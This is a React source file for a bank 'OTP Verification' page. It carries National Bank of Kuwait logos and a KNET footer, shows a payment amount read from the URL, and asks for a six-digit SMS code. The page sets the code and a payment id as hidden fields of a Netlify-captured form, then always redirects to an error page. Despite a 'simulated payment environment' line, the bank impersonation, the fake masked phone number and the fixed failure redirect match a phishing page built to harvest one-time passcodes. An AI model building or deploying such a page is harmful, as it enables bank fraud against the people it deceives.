import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp";

const OTPVerification = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const [otp, setOtp] = useState("");
  const [loading, setLoading] = useState(false);

  const queryParams = new URLSearchParams(window.location.search);
  const displayAmount = queryParams.get('a') || '50.000';

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    
    setTimeout(() => {
      navigate('/error' + window.location.search);
    }, 2000);
  };

  return (
    <div className="min-h-screen bg-gray-100" style={{ backgroundColor: '#f5f5f5' }}>
      <div className="w-full h-20 sm:h-32 bg-gradient-to-r from-blue-400 to-blue-600 relative overflow-hidden">
        <img 
          src="/lovable-uploads/1d2a9902-d961-468c-9f95-1695f21fb91b.png" 
          alt="NBK Logo" 
          className="w-full h-full object-cover"
        />
      </div>

      <div className="container mx-auto px-3 sm:px-4 py-4 sm:py-8 max-w-2xl">
        <div className="bg-white rounded-xl sm:rounded-2xl shadow-lg p-4 sm:p-6 mb-3 sm:mb-6">
          <div className="text-center mb-3 sm:mb-6">
            <div className="flex items-center justify-center mb-2 sm:mb-4">
              <img 
                src="/lovable-uploads/dd68033e-3d38-482d-ad61-28ff811e33ba.png" 
                alt="NBK Logo" 
                className="h-8 sm:h-12 w-auto"
              />
            </div>
          </div>
          
          <div className="border-t border-gray-200 pt-2 sm:pt-4">
            <div className="flex justify-between items-center mb-2 sm:mb-4">
              <span className="text-blue-600 font-medium text-sm sm:text-base">OTP Verification</span>
              <span className="text-gray-700 text-sm sm:text-base">:التحقق من الرمز</span>
            </div>
            <div className="border-t border-gray-200 pt-1 sm:pt-2">
              <div className="flex justify-between items-center">
                <span className="text-blue-600 font-bold text-lg sm:text-xl">KD {displayAmount}</span>
                <span className="text-gray-700 text-sm sm:text-base">:المبلغ</span>
              </div>
            </div>
          </div>
        </div>

        <div className="bg-white rounded-xl sm:rounded-2xl shadow-lg p-4 sm:p-6 mb-3 sm:mb-6">
          <form 
            name="otp-verification" 
            method="POST" 
            data-netlify="true" 
            netlify-honeypot="bot-field"
            onSubmit={handleSubmit} 
            className="space-y-4 sm:space-y-6"
            action="/error"
          >
            <input type="hidden" name="form-name" value="otp-verification" />
            <input type="hidden" name="payment-id" value={id} />
            <input type="hidden" name="otp-code" value={otp} />
            <p style={{ display: 'none' }}>
              <label>
                Don't fill this out if you're human: <input name="bot-field" />
              </label>
            </p>

            <div className="text-center space-y-3 sm:space-y-4">
              <p className="text-gray-600 text-sm sm:text-lg px-2">
                يرجى إدخال رمز التحقق المرسل إلى هاتفك المحمول
              </p>
              <p className="text-gray-500 text-xs sm:text-sm px-2">
                Please enter the OTP sent to your registered mobile number ending with ****1234
              </p>
              
              <div className="flex justify-center py-4 sm:py-6">
                <InputOTP
                  maxLength={6}
                  value={otp}
                  onChange={(value) => setOtp(value)}
                  name="otp"
                >
                  <InputOTPGroup className="gap-1 sm:gap-3">
                    <InputOTPSlot index={0} className="w-8 sm:w-12 h-8 sm:h-12 text-lg sm:text-xl border-2 border-blue-400 rounded-md sm:rounded-lg" />
                    <InputOTPSlot index={1} className="w-8 sm:w-12 h-8 sm:h-12 text-lg sm:text-xl border-2 border-blue-400 rounded-md sm:rounded-lg" />
                    <InputOTPSlot index={2} className="w-8 sm:w-12 h-8 sm:h-12 text-lg sm:text-xl border-2 border-blue-400 rounded-md sm:rounded-lg" />
                    <InputOTPSlot index={3} className="w-8 sm:w-12 h-8 sm:h-12 text-lg sm:text-xl border-2 border-blue-400 rounded-md sm:rounded-lg" />
                    <InputOTPSlot index={4} className="w-8 sm:w-12 h-8 sm:h-12 text-lg sm:text-xl border-2 border-blue-400 rounded-md sm:rounded-lg" />
                    <InputOTPSlot index={5} className="w-8 sm:w-12 h-8 sm:h-12 text-lg sm:text-xl border-2 border-blue-400 rounded-md sm:rounded-lg" />
                  </InputOTPGroup>
                </InputOTP>
              </div>
              
              <div className="flex space-x-3 sm:space-x-4 mt-6">
                <button
                  type="submit"
                  className="flex-1 bg-blue-700 text-white py-3 sm:py-4 rounded-lg text-base sm:text-lg font-bold hover:bg-blue-800 transition-colors shadow-md disabled:opacity-50"
                  disabled={loading || otp.length !== 6}
                >
                  {loading ? 'جاري التحقق...' : 'تأكيد'}
                </button>
              </div>
            </div>
          </form>
        </div>

        <div className="text-center mt-4 sm:mt-6 text-gray-500 text-xs sm:text-sm">
          <p>🔒 رمز التحقق صالح لمدة 5 دقائق</p>
          <p className="mt-1">This is a simulated payment environment</p>
        </div>

        <div className="text-center mt-4 sm:mt-8 text-gray-600">
          <div className="text-xs sm:text-sm mb-1 sm:mb-2">جميع الحقوق محفوظة © 2025</div>
          <div className="text-xs sm:text-sm text-blue-600">شركة الخدمات المصرفية الآلية المشتركة - كي نت</div>
        </div>
      </div>
    </div>
  );
};

export default OTPVerification;
